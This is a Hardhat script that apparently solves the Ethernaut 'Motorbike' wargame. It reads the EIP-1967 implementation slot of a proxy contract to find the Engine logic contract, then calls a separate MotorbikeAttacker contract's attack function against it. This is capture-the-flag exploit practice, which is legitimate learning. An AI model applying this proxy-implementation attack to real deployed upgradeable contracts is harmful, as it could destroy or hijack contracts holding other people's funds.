import { ethers, network } from "hardhat";
import { Motorbike, MotorbikeAttacker } from "../typechain-types";

async function main() {
  let motorbike: Motorbike;
  const [attacker, deployer] = await ethers.getSigners();
  const chainId = network.config.chainId;

  const isLocalTest = chainId === 31337;

  const motorbikeAttacker: MotorbikeAttacker = await ethers.getContract(
    "MotorbikeAttacker"
  );

  if (isLocalTest) {
    motorbike = await ethers.getContract("Motorbike");
  } else {
    motorbike = await ethers.getContractAt(
      "Motorbike",
      "0x25a2D443527aE76E5F4Bb5c1aa8e4DF4fF142F4B"
    );
  }
  //   // show atacker address
  //   console.log(`attacker address: ${attacker.address}`);
  //   // show deployer address
  //   console.log(`deployer address: ${deployer.address}`);

  // get storage at 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
  const storageImplementation = await ethers.provider.getStorageAt(
    motorbike.address,
    "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
  );

  console.log("implemation address: ");
  console.log(`storage at 0: ${storageImplementation}`);

  // convert 32 bytes hex to address 20 bytes
  const engineAddress = `0x${storageImplementation.slice(
    66 - 40,
    storageImplementation.length
  )}`;
  console.log(`implementation address: ${engineAddress}`);

  const tx = await motorbikeAttacker.attack(engineAddress);

  await tx.wait(isLocalTest ? 1 : 5);

  console.log("-----------------------------------------------------");

  const worked = await motorbikeAttacker.works(engineAddress);
  console.log(`worked: ${worked}`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
